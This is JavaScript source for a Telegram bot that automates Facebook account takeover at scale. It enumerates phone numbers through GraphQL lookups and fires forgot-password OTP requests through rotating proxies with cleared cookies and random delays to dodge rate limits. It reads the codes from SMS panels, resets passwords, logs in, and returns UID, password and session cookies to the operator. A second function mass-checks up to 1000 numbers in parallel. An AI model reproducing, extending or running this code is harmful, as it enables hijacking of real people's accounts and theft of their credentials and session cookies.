      await sendMessage(chatId, '⚠️ No valid phone numbers provided for PC clone.', {
        inline_keyboard: [[btnNav('⬅️ PC Clone', 'menu:pc_clone')]],
      });
      return;
    }

    const lamixTok = resolveFbToolsLamixToken();
    const hasActivePanels = readPanelsStore().panels.some((p) => p.active !== false);
    const otpResendTarget = Math.max(1, Math.min(12, Number(cfg.pc_otp_resends ?? 3)));
    const recoveryLinks = normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true });
    const runState = {
      running: true,
      abortRequested: false,
      total: targetList.length,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: null,
      startedAt: Date.now(),
    };
    activeRuns.set(uid, runState);

    const shortProxyDisplay = (proxyUrl, iso = '', ssid = '') => {
      if (!proxyUrl) return `Direct [${iso || 'AUTO'}]`;
      try {
        const u = new URL(proxyUrl);
        return `${u.hostname}:${u.port || '80'} [${iso || 'AUTO'}]${ssid ? ` #${ssid.slice(0, 4)}` : ''}`;
      } catch {
        return `Proxy [${iso || 'AUTO'}]`;
      }
    };

    const progRes = await sendMessage(
      chatId,
      [
        `💻 <b>PC CLONE ADVANCED PRO ENGINE (${otpResendTarget}x OTP)</b>`,
        DIVIDER,
        `🚀 Initializing <code>0/${targetList.length}</code> numbers via <code>${recoveryLinks.length}</code> FB link(s)...`,
        `🌐 Proxy Pool: <code>${proxyPool.length || (cfg.proxy ? 1 : 0)}</code> • 🔁 Auto-Retry: <code>3x Proxy Rotation</code>`,
        `📡 SMS Receiver: ${(lamixTok || hasActivePanels) ? '🟢 Auto SMS Server ON' : '🔐 Queue + Live Resend Buttons'}`,
      ].join('\n'),
      { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] }
    );
    const progMsgId = progRes.ok ? progRes.result?.message_id : null;

    pushBotLog(`User ${uid} started PC Clone batch (${targetList.length} nums, ${otpResendTarget}x OTP, ${proxyPool.length} proxies)`);
    appendUserLog(uid, `PC CLONE STARTED: ${targetList.length} numbers (${otpResendTarget}x forgot OTP)`);

    (async () => {
      const watchMap = new Map();
      const verifiedAccounts = [];
      const sentNumbers = [];
      const failedNumbers = [];
      const freeNumbers = [];
      const recentFeed = [];
      const seenLamixIds = new Set();
      const seenPanelSmsKeys = new Set();
      const badProxies = new Set();
      let activeProxyText = proxyPool.length > 0 || cfg.proxy ? 'Rotating...' : 'Direct (No Proxy)';
      let deletedFree = 0;
      let triggeredCount = 0;
      let nextIdx = 0;
      let workersDone = false;

      const pushFeed = (line) => {
        recentFeed.push(line);
        if (recentFeed.length > 8) recentFeed.shift();
      };

      const batchRecord = {
        sentNumbers,
        failedNumbers,
        freeNumbers,
        verifiedAccounts,
        recentFeed,
        startedAt: runState.startedAt,
      };
      pcBatchState.set(uid, batchRecord);

      if (lamixTok) {
        const preL = await fetchLamixMessages(lamixTok, 80);
        if (preL.ok) {
          for (const row of preL.messages) {
            const f = getLamixMsgFields(row);
            if (f.id) seenLamixIds.add(f.id);
          }
        }
      }
      if (hasActivePanels) {
        const preP = await fetchAllActivePanelsSms(true);
        if (preP.ok) {
          for (const row of preP.rows) {
            seenPanelSmsKeys.add(smsRowKey(row));
          }
        }
      }

      const buildLiveKeyboard = () => {
        const rows = [];
        const activeWaiting = Array.from(watchMap.values()).filter((w) => !w.done);
        if (activeWaiting.length > 0) {
          const quickRow = activeWaiting.slice(-2).map((w) =>
            btnNav(`🔁 +${w.phone.slice(-6)} (${w.item?.resendCount || 1}x)`, `pc:quick_resend:${w.phone}`)
          );
          rows.push(quickRow);
          rows.push([
            btnOk(`🔁 Resend All (${activeWaiting.length})`, 'pc:resend_all'),
            btnOk('📡 Sync Auto OTP', 'otp:lamix_sync'),
          ]);
        }
        rows.push([btnBad('🛑 Stop Run', 'menu:stop')]);
        return { inline_keyboard: rows };
      };

      const updatePcProgress = async (statusLine = '', force = false) => {
        if (!progMsgId) return;
        const waitingCnt = Array.from(watchMap.values()).filter((w) => !w.done).length;
        const feedBlock = recentFeed.length > 0
          ? `\n<b>📋 Live Status Feed:</b>\n<blockquote>${recentFeed.join('\n')}</blockquote>`
          : '';
        await editMessage(
          chatId,
          progMsgId,
          [
            `💻 <b>PC CLONE LIVE ENGINE</b>`,
            DIVIDER,
            statusLine || `📱 <b>Checking:</b> <code>${runState.currentNumber ? '+' + escapeHtml(runState.currentNumber) : 'Processing...'}</code>`,
            `🌐 <b>Proxy:</b> <code>${escapeHtml(activeProxyText)}</code>`,
            `📊 <code>${renderProgressBar(runState.completed, targetList.length)}</code> (<code>${runState.completed}/${targetList.length}</code>)`,
            `📤 OTP Sent: <code>${triggeredCount}</code>  •  ❌ Not Sent: <code>${failedNumbers.length}</code>  •  🗑 Free: <code>${deletedFree}</code>`,
            `✅ Login OK: <code>${verifiedAccounts.length}</code>  •  ⏳ Waiting OTP: <code>${waitingCnt}</code>${feedBlock}`,
          ].join('\n'),
          buildLiveKeyboard(),
          { throttle: true, noRetry: true, minIntervalMs: force ? 900 : 2000 }
        );
      };

      const completeWatchLogin = async (w, uidFound, passUsed, cookiesFound, codeUsed, viaLabel) => {
        if (!w || w.done) return;
        w.done = true;
        runState.okCount += 1;
        runState.pendingCount = Math.max(0, runState.pendingCount - 1);
        const cstr = formatCookieHeader(cookiesFound || {});
        const recLine = `${uidFound}|${passUsed}|${cstr}`;
        verifiedAccounts.push({ phone: w.phone, uid: uidFound, pass: passUsed, cstr, line: recLine, iso: w.iso });
        pushFeed(`🔓 <code>+${escapeHtml(w.phone)}</code> [${escapeHtml(w.iso)}] → <b>Login OK!</b>`);
        storeUserAccount(uid, {
          name: w.name,
          phone: w.phone,
          pass: passUsed,
          uid: uidFound,
          status: 'OK',
          confirmed: true,
          engine: `PC_CLONE_${viaLabel}`,
          cookies: cookiesFound,
        });
        writeUserPending(uid, readUserPending(uid).filter((p) => p.phone !== w.phone));
        const usersMap = readUsersMap();
        if (usersMap[uid]) {
          usersMap[uid].totalOk += 1;
          writeUsersMap(usersMap);
        }
        appendUserLog(uid, `PC CLONE LOGIN OK +${w.phone} -> ${uidFound} (${viaLabel})`);
        await sendMessage(
          chatId,
          [
            `✅ <b>PC CLONE LOGIN SUCCESS (${escapeHtml(viaLabel)})</b>`,
            DIVIDER,
            `📱 <b>Number:</b> <code>+${escapeHtml(w.phone)}</code> [<b>${escapeHtml(w.iso || 'AUTO')}</b>]  •  🔑 <b>OTP:</b> <code>${escapeHtml(codeUsed)}</code>`,
            w.item?.usedEntryUrl ? `🔗 <b>Entry Link:</b> <code>${escapeHtml(w.item.usedEntryUrl)}</code>` : '',
            `📋 <b>UID|Pass|Cookies:</b>`,
            `<blockquote><code>${escapeHtml(recLine.slice(0, 450))}${recLine.length > 450 ? '...' : ''}</code></blockquote>`,
          ]
            .filter(Boolean)
            .join('\n'),
          { inline_keyboard: [[btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('💻 PC Clone', 'menu:pc_clone')]] }
        );
      };

      const tryCheckOtpAndLoginForWatch = async (w) => {
        if (!w || w.done || w.verifying || (!lamixTok && !hasActivePanels)) return null;
        w.verifying = true;
        try {
          if (lamixTok) {
            const lRes = await fetchLamixMessages(lamixTok, 80);
            if (lRes.ok && lRes.messages.length > 0) {
              for (const row of lRes.messages) {
                const f = getLamixMsgFields(row);
                if (!f.message || (f.id && seenLamixIds.has(f.id))) continue;
                if (!phoneDigitsMatch(f.number, w.phone)) continue;
                if (f.ts && f.ts < runState.startedAt - 120000) continue;
                if (f.id) seenLamixIds.add(f.id);
                const code = extractFbOtpFromSms(f.message);
                if (!code) continue;
                await updatePcProgress(`📩 <b>Auto OTP!</b> <code>+${escapeHtml(w.phone)}</code> → <code>${escapeHtml(code)}</code> (Logging in...)`, true);
                const logRes = await submitRecoveryOtpAndLogin({ ...w.item }, code, w.pass, cfg);
                if (logRes.status === 'OK') {
                  await completeWatchLogin(w, logRes.uid, logRes.pass || w.pass, logRes.cookies, code, 'AUTO_OTP');
                  return logRes;
                } else if (logRes.status === 'RETRY') {
                  w.item = logRes.item;
                  upsertUserPending(uid, logRes.item);
                }
              }
            }
          }
          if (hasActivePanels) {
            const pRes = await fetchAllActivePanelsSms(true);
            if (pRes.ok && pRes.rows.length > 0) {
              for (const row of pRes.rows) {
                const key = smsRowKey(row);
                if (seenPanelSmsKeys.has(key)) continue;
                if (!phoneDigitsMatch(row.number, w.phone)) continue;
                seenPanelSmsKeys.add(key);
                const code = extractFbOtpFromSms(row.message);
                if (!code) continue;
                await updatePcProgress(`📩 <b>SMS Panel OTP!</b> <code>+${escapeHtml(w.phone)}</code> → <code>${escapeHtml(code)}</code> (Logging in...)`, true);
                const logRes = await submitRecoveryOtpAndLogin({ ...w.item }, code, w.pass, cfg);
                if (logRes.status === 'OK') {
                  await completeWatchLogin(w, logRes.uid, logRes.pass || w.pass, logRes.cookies, code, 'API_PANEL');
                  return logRes;
                } else if (logRes.status === 'RETRY') {
                  w.item = logRes.item;
                  upsertUserPending(uid, logRes.item);
                }
              }
            }
          }
        } finally {
          w.verifying = false;
        }
        return null;
      };

      const otpPoller = (async () => {
        if (!lamixTok && !hasActivePanels) return;
        let deadline = 0;
        while (!runState.abortRequested) {
          const waiting = Array.from(watchMap.values()).filter((w) => !w.done && !w.verifying);
          if (workersDone) {
            if (Array.from(watchMap.values()).every((w) => w.done)) break;
            if (!deadline) deadline = Date.now() + 90000;
            if (Date.now() > deadline) break;
          }
          if (waiting.length > 0) {
            for (const match of waiting) {
              if (runState.abortRequested) break;
              await tryCheckOtpAndLoginForWatch(match);
            }
          }
          await sleepAbort(2200, () => runState.abortRequested);
        }
      })();

      const worker = async (workerOffset) => {
        while (!runState.abortRequested) {
          const i = nextIdx++;
          if (i >= targetList.length) break;
          const num = targetList[i];
          runState.currentNumber = num;
          const numDet = detectCountryFromNumber(`+${num}`, cfg.cc);
          const effCc = (cfg.auto_proxy_country !== false && numDet?.cc) ? numDet.cc : cfg.cc;
          const effIso = (cfg.auto_proxy_country !== false && numDet?.iso && numDet.iso !== '??') ? numDet.iso : getCountryInfo(effCc)[1];
          const effCName = numDet?.name || getCountryInfo(effCc)[0];

          const pickFreshProxy = (attemptOffset = 0) => {
            if (proxyPool.length === 0 && !cfg.proxy) {
              return { rawPx: null, px: null, ssid: '' };
            }
            const rawPx = proxyPool.length > 0
              ? selectSmartProxy(proxyPool, workerOffset + i + attemptOffset, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null, effIso)
              : cfg.proxy || null;
            const ssid = crypto.randomBytes(6).toString('hex');
            const adapted = adaptProxyForSession(rawPx, {
              iso: effIso,
              autoCountry: cfg.auto_proxy_country !== false,
              refreshSession: true,
              forcedSessionId: ssid,
            });
            return { rawPx, px: adapted.url, ssid };
          };

          let { rawPx, px, ssid } = pickFreshProxy(0);
          activeProxyText = shortProxyDisplay(px, effIso, ssid);

          await updatePcProgress(`🔍 <b>[${i + 1}/${targetList.length}] Checking:</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]...`, true);

          let gql;
          try {
            const checkPx = px || (cfg.gql_via_direct !== false ? null : px);
            gql = await checkNumberGraphql(`+${num}`, {
              cc: effCc,
              proxy: checkPx,
              strictProxy: false,
              forceRefreshSession: true,
              timeoutMs: 12000,
              shouldAbort: () => runState.abortRequested,
            });
          } catch (err) {
            gql = { status: 'unknown', nameHint: '', reason: err instanceof Error ? err.message : 'err' };
          }

          if (gql.status === 'free') {
            deletedFree += 1;
            freeNumbers.push(num);
            runState.completed += 1;
            pushFeed(`🗑 <code>+${escapeHtml(num)}</code> [${escapeHtml(effIso)}] • Free (Deleted)`);
            appendUserLog(uid, `PC CLONE +${num} [${effIso}] FREE -> auto-deleted`);
            await updatePcProgress(`🗑 <b>Auto-Deleted (No FB):</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]`, true);
            if (i + 1 < targetList.length && !runState.abortRequested) {
              await sleepAbort(1100 + Math.floor(Math.random() * 700), () => runState.abortRequested);
            }
            continue;
          }

          const recPass = cfg.password && cfg.password.length >= 6
            ? cfg.password
            : `FbClone@${Math.floor(1000 + Math.random() * 8999)}`;
          const watchEntry = {
            phone: num,
            name: gql.nameHint || `PC Clone ${num.slice(-4)}`,
            pass: recPass,
            iso: effIso,
            startedAt: Date.now(),
            done: false,
            verifying: false,
            item: null,
          };

          let otpRes = { ok: false, err: 'Not attempted' };
          const maxAttempts = (proxyPool.length > 0 || cfg.proxy) ? 3 : 2;

          for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            if (runState.abortRequested) {
              otpRes = { ok: false, aborted: true, err: 'Stopped by user' };
              break;
            }
            // Before EVERY attempt & EVERY number: rotate to a fresh proxy session + 100% clean cookies!
            if (attempt > 1 || attempt === 1) {
              if (attempt > 1) {
                const rotated = pickFreshProxy(attempt - 1);
                rawPx = rotated.rawPx;
                px = rotated.px;
                ssid = rotated.ssid;
                if (attempt === maxAttempts && cfg.strict_proxy === false && (!proxyPool || proxyPool.length <= 1) && !px) {
                  px = null;
                }
                activeProxyText = shortProxyDisplay(px, effIso, ssid);
                await updatePcProgress(
                  `🔄 <b>[${i + 1}/${targetList.length}] Retry ${attempt}/${maxAttempts} (Clean Cookies + New Proxy):</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]...`,
                  true
                );
                const okRetryWait = await sleepAbort(1400 + Math.floor(Math.random() * 900), () => runState.abortRequested);
                if (!okRetryWait) break;
              } else {
                // Start Attempt 1 with a brand-new session ID separate from GQL precheck + 100% wiped cookie jar
                const freshSendPx = pickFreshProxy(0);
                rawPx = freshSendPx.rawPx;
                px = freshSendPx.px;
                ssid = freshSendPx.ssid;
                activeProxyText = shortProxyDisplay(px, effIso, ssid);
                await updatePcProgress(
                  `🌐 <b>[${i + 1}/${targetList.length}] Clean Cookies + New Proxy OTP:</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]...`,
                  true
                );
              }
            }

            try {
              otpRes = await triggerForgotPasswordOtp(num, cfg, px, {
                resends: otpResendTarget,
                recoveryUrls: recoveryLinks,
                cc: effCc,
                iso: effIso,
                country: effCName,
                nameHint: watchEntry.name,
                newPass: recPass,
                rawProxy: rawPx,
                proxiesPool: proxyPool,
                badProxies,
                rotateProxyPerRound: true,
                assumeExists: true,
                freshCookies: true,
                gqlRedirectUri: attempt === 1 ? (gql.redirectUri || '') : '',
                gqlJar: null,
                skipGqlLookup: true,
                shouldAbort: () => runState.abortRequested,
                onAfterOtpSent: async ({ round, totalRounds, otpsSent, usedEntryUrl, item: roundItem }) => {
                  watchEntry.item = roundItem;
                  watchEntry.name = roundItem.name || watchEntry.name;
                  if (!watchMap.has(num)) {
                    triggeredCount += 1;
                    runState.pendingCount += 1;
                    watchMap.set(num, watchEntry);
                  }
                  upsertUserPending(uid, roundItem);
                  await updatePcProgress(
                    `🔁 <b>[${i + 1}/${targetList.length}] OTP ${round}/${totalRounds}x:</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]${usedEntryUrl ? ` via <code>${escapeHtml(new URL(usedEntryUrl).hostname)}</code>` : ''} → Polling SMS...`,
                    false
                  );
                  if (lamixTok || hasActivePanels) {
                    const quickWaitMs = round >= totalRounds ? 1400 : 400;
                    const okPoll = await sleepAbort(quickWaitMs, () => runState.abortRequested);
                    if (okPoll && !watchEntry.done) {
                      const hit = await tryCheckOtpAndLoginForWatch(watchEntry);
                      if (hit && hit.status === 'OK') {
                        return { stop: true, loginResult: hit };
                      }
                    }
                  }
                  return { stop: Boolean(watchEntry.done) };
                },
              });
            } catch (err) {
              if (err && err.isProxyError && rawPx) badProxies.add(proxyHealthKey(rawPx));
              otpRes = { ok: false, proxyError: Boolean(err?.isProxyError), err: err instanceof Error ? err.message : 'Recovery error' };
            }

            if (otpRes.ok || otpRes.notFound || otpRes.aborted) break;
            if (!otpRes.rateLimited && !otpRes.proxyError && attempt >= maxAttempts) break;
          }

          if (otpRes.notFound) {
            if (watchMap.has(num)) {
              watchMap.delete(num);
              triggeredCount = Math.max(0, triggeredCount - 1);
              runState.pendingCount = Math.max(0, runState.pendingCount - 1);
            }
            deletedFree += 1;
            freeNumbers.push(num);
            runState.completed += 1;
            pushFeed(`🗑 <code>+${escapeHtml(num)}</code> [${escapeHtml(effIso)}] • Free (Deleted)`);
            appendUserLog(uid, `PC CLONE +${num} [${effIso}] recover notFound -> auto-deleted`);
          } else if (otpRes.ok && otpRes.item) {
            watchEntry.item = otpRes.item;
            if (!watchMap.has(num)) {
              triggeredCount += 1;
              runState.pendingCount += 1;
              watchMap.set(num, watchEntry);
            }
            if (!watchEntry.done) {
              upsertUserPending(uid, otpRes.item);
            }
            sentNumbers.push({
              phone: num,
              iso: effIso,
              otpsSent: otpRes.otpsSent || 1,
              via: otpRes.via || 'recover',
              proxy: activeProxyText,
              earlyMatched: Boolean(otpRes.earlyMatched),
            });
            runState.completed += 1;
            pushFeed(`✅ <code>+${escapeHtml(num)}</code> [${escapeHtml(effIso)}] • <b>${otpRes.otpsSent}x OTP Sent</b>`);
            appendUserLog(
              uid,
              `PC CLONE +${num} [${effIso}] Forgot OTP ${otpRes.otpsSent}x (${otpRes.via})${otpRes.earlyMatched ? ' [EARLY LOGIN OK]' : ''}`
            );
            await updatePcProgress(
              otpRes.earlyMatched
                ? `✅ <b>Logged In on OTP #${otpRes.otpsSent}:</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]`
                : `📤 <b>[${i + 1}/${targetList.length}] OTP Sent (${otpRes.otpsSent}/${otpResendTarget}x):</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]`,
              false
            );
          } else {
            if (watchMap.has(num)) watchMap.delete(num);
            const reasonTxt = otpRes.err || 'no recovery form';
            failedNumbers.push({ phone: num, iso: effIso, reason: reasonTxt, proxy: activeProxyText });
            runState.failCount += 1;
            runState.completed += 1;
            pushFeed(`❌ <code>+${escapeHtml(num)}</code> [${escapeHtml(effIso)}] • ${escapeHtml(reasonTxt.slice(0, 26))}`);
            appendUserLog(uid, `PC CLONE +${num} [${effIso}] failed: ${reasonTxt}`);
          }

          await updatePcProgress();

          // Polite cooldown delay between numbers so Facebook never triggers "going too fast" IP block
          if (i + 1 < targetList.length && !runState.abortRequested) {
            await sleepAbort(1800 + Math.floor(Math.random() * 1000), () => runState.abortRequested);
          }
        }
      };

      // In PC Clone, run strictly 1-by-1 sequentially per user so each number gets a dedicated clean proxy session & max OTP reliability
      await worker(0);
      workersDone = true;

      if ((lamixTok || hasActivePanels) && Array.from(watchMap.values()).some((w) => !w.done) && !runState.abortRequested) {
        await updatePcProgress(`📡 <b>Waiting up to 90s for SMS OTPs...</b>`, true);
      }
      await otpPoller;

      // Clear temporary base cookies automatically after every batch
      regenUserCookies(uid);
      clearUserDone(uid);

      runState.running = false;
      runState.currentNumber = null;
      const stillPending = Array.from(watchMap.values()).filter((w) => !w.done);

      if (progMsgId) {
        const sentSummaryLines = sentNumbers.slice(0, 8).map(
          (s) => `   ✅ <code>+${escapeHtml(s.phone)}</code> [${escapeHtml(s.iso)}] — <b>${s.otpsSent}x OTP</b>`
        );
        const failSummaryLines = failedNumbers.slice(0, 8).map(
          (f) => `   ❌ <code>+${escapeHtml(f.phone)}</code> [${escapeHtml(f.iso)}] — ${escapeHtml(f.reason.slice(0, 32))}`
        );

        const finalKbRows = [];
        for (let idx = 0; idx < Math.min(6, stillPending.length); idx += 2) {
          const row = [
            btnNav(`🔁 +${stillPending[idx].phone.slice(-6)} (${stillPending[idx].item?.resendCount || 1}x)`, `pc:quick_resend:${stillPending[idx].phone}`),
          ];
          if (stillPending[idx + 1]) {
            row.push(
              btnNav(`🔁 +${stillPending[idx + 1].phone.slice(-6)} (${stillPending[idx + 1].item?.resendCount || 1}x)`, `pc:quick_resend:${stillPending[idx + 1].phone}`)
            );
          }
          finalKbRows.push(row);
        }
        const bulkRow = [];
        if (stillPending.length > 0) bulkRow.push(btnOk(`🔁 Resend All Active (${stillPending.length})`, 'pc:resend_all'));
        if (failedNumbers.length > 0) bulkRow.push(btnBad(`🔄 Retry Failed (${failedNumbers.length})`, 'pc:retry_failed'));
        if (bulkRow.length > 0) finalKbRows.push(bulkRow);
        finalKbRows.push([
          btnOk('📡 Sync Auto OTPs', 'otp:lamix_sync'),
          btnNav(`🔐 OTP Queue (${stillPending.length})`, 'menu:otp'),
        ]);
        finalKbRows.push([
          btnOk('📦 Accounts Vault', 'menu:accounts'),
          btnBad('🗑 ডাউনলোড শেষ — ফাইল ও কুকিজ ডিলিট', 'pc:wipe_my_data'),
        ]);
        finalKbRows.push([btnNav('💻 Run More', 'menu:pc_clone')]);

        const bodyLines = [
          runState.abortRequested ? `🛑 <b>PC CLONE STOPPED</b>` : `🏁 <b>PC CLONE COMPLETED</b>`,
          DIVIDER,
          `📊 <b>Processed:</b> <code>${runState.completed}/${targetList.length}</code>`,
          `📤 <b>OTP Sent OK:</b> <code>${sentNumbers.length}</code>  •  ❌ <b>Not Sent:</b> <code>${failedNumbers.length}</code>  •  🗑 <b>Free:</b> <code>${deletedFree}</code>`,
          `✅ <b>Logged In (UID|Pass|Cookies):</b> <code>${verifiedAccounts.length}</code>  •  🔐 <b>In Queue:</b> <code>${stillPending.length}</code>`,
          `🧼 <b>Session Cookies:</b> <i>Auto-cleared for your next clean run</i>`,
        ];
        if (sentSummaryLines.length > 0) {
          bodyLines.push('', `<b>✅ OTP Sent Numbers${sentNumbers.length > 8 ? ` (Top 8/${sentNumbers.length})` : ''}:</b>`, `<blockquote>${sentSummaryLines.join('\n')}</blockquote>`);
        }
        if (failSummaryLines.length > 0) {
          bodyLines.push('', `<b>❌ Failed / Not Sent${failedNumbers.length > 8 ? ` (Top 8/${failedNumbers.length})` : ''}:</b>`, `<blockquote>${failSummaryLines.join('\n')}</blockquote>`);
        }
        if (stillPending.length > 0) {
          bodyLines.push('', `👇 <i>যেকোনো নাম্বারে সরাসরি OTP রিসেন্ট মারতে নিচের বাটনে চাপুন:</i>`);
        }

        await editMessage(
          chatId,
          progMsgId,
          bodyLines.join('\n'),
          { inline_keyboard: finalKbRows }
        );
      }

      const fileParts = [];
      if (verifiedAccounts.length > 0) {
        fileParts.push(...verifiedAccounts.map((a) => a.line));
      }
      if (stillPending.length > 0) {
        fileParts.push('', `# OTP_SENT_PENDING (+phone|name|pass|iso|otps_sent)`);
        for (const w of stillPending) {
          fileParts.push(`+${w.phone}|${w.name}|${w.pass}|${w.iso}|OTP:${w.item?.resendCount || 1}`);
        }
      }
      if (failedNumbers.length > 0) {
        fileParts.push('', `# NOT_SENT_FAILED (+phone|iso|reason)`);
        for (const f of failedNumbers) {
          fileParts.push(`+${f.phone}|${f.iso}|${f.reason}`);
        }
      }
      await sendDocumentText(
        chatId,
        `PC_CLONE_${uid}_${Date.now()}.txt`,
        fileParts.join('\n') || 'No registered Facebook accounts found in this batch (all free numbers auto-deleted).',
        `PC Clone: ${verifiedAccounts.length} Logged-In • ${sentNumbers.length} OTP Sent • ${failedNumbers.length} Failed • ${deletedFree} Free\n📌 অনুরোধ: ফাইলটি ডাউনলোড হয়ে গেলে বটের জায়গা ও আপনার নিরাপত্তা রক্ষায় নিচের Delete বাটনে চাপ দিয়ে অ্যাকাউন্ট ও কুকিজ ক্লিয়ার করে দিন।`
      );
      if (verifiedAccounts.length > 0 || stillPending.length > 0) {
        await sendMessage(
          chatId,
          `📌 <b>গুরুত্বপূর্ণ অনুরোধ:</b>\nআপনার ফাইলটি ডাউনলোড করা শেষ হলে অনুগ্রহ করে নিচের বাটনে ক্লিক করে আপনার অ্যাকাউন্ট ও কুকিজগুলো বট থেকে ডিলিট করে দিন। এতে বট সবার জন্য সুপার ফাস্ট থাকবে এবং আপনার আইডিগুলোও সুরক্ষিত থাকবে!`,
          {
            inline_keyboard: [
              [btnBad('🗑 ডাউনলোড করেছি — অ্যাকাউন্ট ও কুকিজ ডিলিট করুন', 'pc:wipe_my_data')],
              [btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('💻 PC Clone', 'menu:pc_clone')],
            ],
          }
        );
      }
    })();
  }

  async function runGraphqlBatchCheck(chatId, uid, numbersInput) {
    const st = readSettings();
    const cfg = readUserConfig(uid);
    const existing = activeRuns.get(uid);
    if (existing?.running) {
      await sendMessage(chatId, '⏳ A batch job is already running for your account. Stop it or wait for completion.', {
        inline_keyboard: [[btnBad('🛑 Stop Active Run', 'menu:stop')]],
      });
      return;
    }

    const userProxies = readUserProxies(uid);
    const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
    const targetList = numbersInput.slice(0, 1000);
    const wantProxy = Boolean(cfg.checker_use_proxy);
    const hasAnyProxy = proxyPool.length > 0 || Boolean(cfg.proxy);
    const useProxyPool = wantProxy && hasAnyProxy;
    const modeLabel = useProxyPool ? '🌐 PROXY POOL (20x)' : '⚡ DIRECT TOKEN (25x • 0 Proxy Cost)';

    if (targetList.length === 0) {
      await sendMessage(chatId, '⚠️ No valid phone numbers to check.', {
        inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
      });
      return;
    }

    const runState = {
      running: true,
      abortRequested: false,
      total: targetList.length,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: null,
      startedAt: Date.now(),
    };
    activeRuns.set(uid, runState);

    const startedAt = Date.now();
    const startPxBytes = proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes;
    const progRes = await sendMessage(
      chatId,
      `🔍 <b>FB CHECKER &amp; NUMBER SPLITTER</b>\n${DIVIDER}\n🛡 <b>Mode:</b> <code>${modeLabel}</code>\n⚡ Harvesting fresh FB token &amp; probing <code>0/${targetList.length}</code> numbers...`,
      { inline_keyboard: [[btnBad('🛑 Stop Check', 'menu:stop')]] }
    );
    const progMsgId = progRes.ok ? progRes.result?.message_id : null;

    (async () => {
      await harvestGqlSessionDirect(true).catch(() => null);

      const freeList = [];
      const takenList = [];
      const unknownList = [];
      let rateLimitedCount = 0;
      const badProxies = new Set();
      let checkedCount = 0;
      let nextIdx = 0;

      const probeOne = async (num, workerOffset) => {
        const numDet = detectCountryFromNumber(`+${num}`, cfg.cc);
        const effCc = (cfg.auto_proxy_country !== false && numDet?.cc) ? numDet.cc : cfg.cc;
        const effIso = (cfg.auto_proxy_country !== false && numDet?.iso && numDet.iso !== '??') ? numDet.iso : getCountryInfo(effCc)[1];
        let px = null;
        let rawPx = null;
        if (useProxyPool) {
          rawPx =
            proxyPool.length > 0
              ? selectSmartProxy(proxyPool, workerOffset, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null)
              : cfg.proxy || null;
          px = adaptProxyForSession(rawPx, {
            iso: effIso,
            autoCountry: cfg.auto_proxy_country !== false,
            refreshSession: cfg.auto_proxy_refresh !== false,
          }).url;
        }
        try {
          return await checkNumberGraphql(`+${num}`, {
            cc: effCc,
            proxy: px,
            strictProxy: cfg.strict_proxy !== false,
            timeoutMs: useProxyPool ? 10000 : 12000,
            shouldAbort: () => runState.abortRequested,
          });
        } catch (err) {
          if (err && err.isProxyError && rawPx) badProxies.add(proxyHealthKey(rawPx));
          return { status: 'unknown', nameHint: '', reason: err instanceof Error ? err.message : 'err' };
        }
      };

      const checkerWorker = async () => {
        while (!runState.abortRequested) {
          const i = nextIdx++;
          if (i >= targetList.length) break;
          const num = targetList[i];
          runState.currentNumber = num;
          let res = await probeOne(num, i);
          if ((res.status === 'ratelimit' || res.status === 'unknown') && !runState.abortRequested) {
            await sleepAbort(220 + Math.floor(Math.random() * 200), () => runState.abortRequested);
            if (!runState.abortRequested) res = await probeOne(num, i + 7);
          }

          if (res.status === 'free') {
            freeList.push(num);
            runState.okCount += 1;
          } else if (res.status === 'taken') {
            takenList.push({ num, hint: res.nameHint || '' });
            runState.failCount += 1;
          } else {
            if (res.status === 'ratelimit') rateLimitedCount += 1;
            unknownList.push({ num, reason: res.reason || 'unknown' });
          }

          checkedCount += 1;
          runState.completed = checkedCount;
          if (progMsgId && checkedCount < targetList.length) {
            const elapsed = ((Date.now() - startedAt) / 1000).toFixed(1);
            editMessage(
              chatId,
              progMsgId,
              [
                `🔍 <b>FB CHECKER &amp; NUMBER SPLITTER</b> (${elapsed}s)`,
                DIVIDER,
                `🛡 <b>Route:</b> <code>${modeLabel}</code>`,
                `📊 <code>${renderProgressBar(checkedCount, targetList.length)}</code> (<code>${checkedCount}/${targetList.length}</code>)`,
                `🟢 Fresh (No Acc): <code>${freeList.length}</code>  •  🔴 Taken: <code>${takenList.length}</code>  •  🟡 Unknown/RL: <code>${unknownList.length}</code>`,
              ].join('\n'),
              { inline_keyboard: [[btnBad('🛑 Stop Check', 'menu:stop')]] },
              { throttle: true, noRetry: true, minIntervalMs: 2500 }
            ).catch(() => {});
          }
        }
      };

      const checkerThreads = Math.min(useProxyPool ? 20 : 25, targetList.length);
      await Promise.all(Array.from({ length: checkerThreads }, () => checkerWorker()));

      runState.running = false;
      runState.currentNumber = null;
      normalizedFreeCache.set(uid, freeList);
      normalizedTakenCache.set(uid, takenList.map((t) => t.num));

      const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
      const pxUsedDelta = Math.max(0, (proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes) - startPxBytes);

      const lines = [
        `📊 <b>GRAPHQL CHECK &amp; SPLIT ${runState.abortRequested ? 'STOPPED' : 'COMPLETE'} (${checkedCount}/${targetList.length} in ${elapsedSec}s)</b>`,
        DIVIDER,
